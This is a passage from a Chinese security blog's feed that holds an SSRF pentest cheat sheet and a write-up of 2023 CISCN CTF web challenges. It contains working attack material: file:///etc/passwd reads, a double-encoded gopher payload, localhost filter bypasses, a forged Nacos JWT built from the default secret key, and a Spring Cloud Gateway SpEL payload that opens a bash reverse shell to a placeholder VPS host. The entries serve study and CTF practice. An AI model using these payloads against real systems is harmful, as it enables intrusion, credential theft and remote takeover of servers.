      
      
        <tags>
            
            <tag> Pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Server-Side Request Forgery (SSRF)</title>
      <link href="/2024/01/29/pentest/web-pentest/SSRF/"/>
      <url>/2024/01/29/pentest/web-pentest/SSRF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1727233862238.png" alt="img"></p><p>example</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;passwd&quot;</span>] === <span class="string">&quot;adminTrue&quot;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;not 127.0.0.1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/ssrf.php?passwd=adminTrue</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">dict://</span><br><span class="line">gopher://</span><br><span class="line">ftp://</span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>file:&#x2F;&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">file:///etc/passwd</span><br><span class="line">file:///etc/hosts</span><br><span class="line">file:///proc/net/arp</span><br><span class="line">file:///proc/net/fib_trie</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>dict:&#x2F;&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 配合Capture探测存活主机和端口</span><br><span class="line">dict://ip:port</span><br></pre></td></tr></table></figure><p>http:&#x2F;&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 配合Capture扫目录</span><br><span class="line">http://ip:&lt;port&gt;/&lt;file&gt;</span><br></pre></td></tr></table></figure><p>gopher:&#x2F;&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 默认端口 70</span><br><span class="line">gopher://ip:port/_gopher-text# _ 是填充位（可为任意字符），不会被接收</span><br><span class="line"></span><br><span class="line"># gopher是第一台服务器解析，_ 后的数据是第二台服务器解析，所以需要双重url编码</span><br><span class="line">gopher%3A%2F%2F172.250.250.4%3A80%2F_%2550%254f%2553%2554%2520%252f%256e%2561%256d%2565%252e%2570%2568%2570%253f%256e%2561%256d%2565%253d%2571%2571%2571%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2537%2532%252e%2532%2535%2530%252e%2532%2535%2530%252e%2534%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2531%2530%250d%250a%250d%250a%256e%2561%256d%2565%253d%256e%2532%2572%2579%2578</span><br><span class="line"></span><br><span class="line"># _ 后的数据双重url解码</span><br><span class="line"></span><br><span class="line">POST /name.php?name=qqq HTTP/1.1</span><br><span class="line">Host: 172.250.250.4</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">name=n2ryx</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>进制转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># localhost 127.0.0.1</span><br><span class="line">http://0x7F.0.0.1//16进制</span><br><span class="line">http://0177.0.0.1//8进制</span><br><span class="line">http://2130706433//10进制整数格式</span><br><span class="line">http://0x7F00000116进制整数格式</span><br><span class="line">http://127.1//省略模式</span><br><span class="line">http://127.127.127.127//用CIDR绕过localhost</span><br><span class="line">http://0//特殊地址0</span><br><span class="line">http://0.0.0.0</span><br><span class="line">http://[::1]//ipv6回环地址</span><br></pre></td></tr></table></figure><p>302重定向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:2222</span><br><span class="line">服务下的index.php: &lt;?php header(&#x27;Location: http://127.0.0.1/flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">payload: url=http://构造重定向的ip:2222/</span><br></pre></td></tr></table></figure><p>DNS重绑定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://lock.cmpxchg8b.com/rebinder.html</span><br><span class="line"></span><br><span class="line">http://example —&gt; 127.0.0.1</span><br></pre></td></tr></table></figure><p><code> # @</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@www.qq.com  // 实则访问www.qq.com</span><br><span class="line">http://www.baidu.com#www.qq.com  // 实则访问www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h2><p>Usage</p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>gopherus –help</td><td>Help</td></tr><tr><td>gopherus –exploit</td><td>Arguments can be :</td></tr><tr><td></td><td>–exploit mysql</td></tr><tr><td></td><td>–exploit postgresql</td></tr><tr><td></td><td>–exploit fastcgi</td></tr><tr><td></td><td>–exploit redis</td></tr><tr><td></td><td>–exploit zabbix</td></tr><tr><td></td><td>–exploit pymemcache</td></tr><tr><td></td><td>–exploit rbmemcache</td></tr><tr><td></td><td>–exploit phpmemcache</td></tr><tr><td></td><td>–exploit dmpmemcache</td></tr><tr><td></td><td>–exploit smtp</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240523173515208.png" alt="image-20240523173515208"></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023CISCN初赛</title>
      <link href="/2024/01/20/writeup/ciscn/2023CISCN%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/01/20/writeup/ciscn/2023CISCN%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2023CISCN初赛"><a href="#2023CISCN初赛" class="headerlink" title="2023CISCN初赛"></a>2023CISCN初赛</h1><h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>题型：文件上传（软连接）</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326122623734.png" alt="image-20240326122623734"></p><p>点击上传，跳转到upload.php，高亮源码</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326122625315.png" alt="image-20240326122625315"></p><p>软连接</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326123325173.png" alt="image-20240326123325173"></p><p>依次上传 1.zip、2.zip</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326123701286.png" alt="image-20240326123701286"></p><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>题型：nacos身份认证漏洞+Nacos结合Spring Cloud Gateway RCE利用</p><h3 id="nacos身份认证漏洞"><a href="#nacos身份认证漏洞" class="headerlink" title="nacos身份认证漏洞"></a>nacos身份认证漏洞</h3><p>这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞</p><p>影响版本：0.1.0&lt;&#x3D; Nacos&lt;&#x3D; 2.2.0</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326213857112.png" alt="image-20240326213857112"></p><p>默认密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure><p>exp为时间戳，大于当前时间即可</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326214023826.png" alt="image-20240326214023826"></p><p>发送到重放模块，添加Authorization: Bearer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326214430882.png" alt="image-20240326214430882"></p><p>登入系统</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326214455398.png" alt="image-20240326214455398"></p><h3 id="Nacos结合Spring-Cloud-Gateway-RCE利用"><a href="#Nacos结合Spring-Cloud-Gateway-RCE利用" class="headerlink" title="Nacos结合Spring Cloud Gateway RCE利用"></a><a href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a></h3><p>该漏洞在网上公开POC的利用方式是通过&#x2F;actuator&#x2F;gateway&#x2F;routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## application.yaml</span></span><br><span class="line"><span class="attr">management.endpoint.gateway.enabled:</span> <span class="literal">true</span> <span class="comment"># default value</span></span><br><span class="line"><span class="attr">management.endpoints.web.exposure.include:</span> <span class="string">gateway</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327132354140.png" alt="image-20240327132354140"></p><p>题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。<a href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a><code>配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327132550145.png" alt="image-20240327132550145"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">exam</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://service-provider</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/echo/**</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddResponseHeader</span></span><br><span class="line">              <span class="attr">args:</span></span><br><span class="line">                <span class="attr">name:</span> <span class="string">result</span></span><br><span class="line">                <span class="attr">value:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327135741495.png" alt="image-20240327135741495"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240326215608435.png" alt="image-20240326215608435"></p><p>上面是yaml格式，不过很多博客讲要用json格式（json也可以）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>题型：go的session伪造+pongo2模板注入</p><p>没有深入</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 判断是否携带了cookie，如果cookie中的name为空，就将其设置为guest</span></span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 获取session中的name的值，若不为admin则后续无法进行，因此需要过的第一关是对session进行伪造，后续是pongo2的ssti</span></span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 获取会话，然后判断name字段是否为空，不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求</span></span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>伪造session</p><p>修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327192605632.png" alt="image-20240327192605632"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327200832964.png" 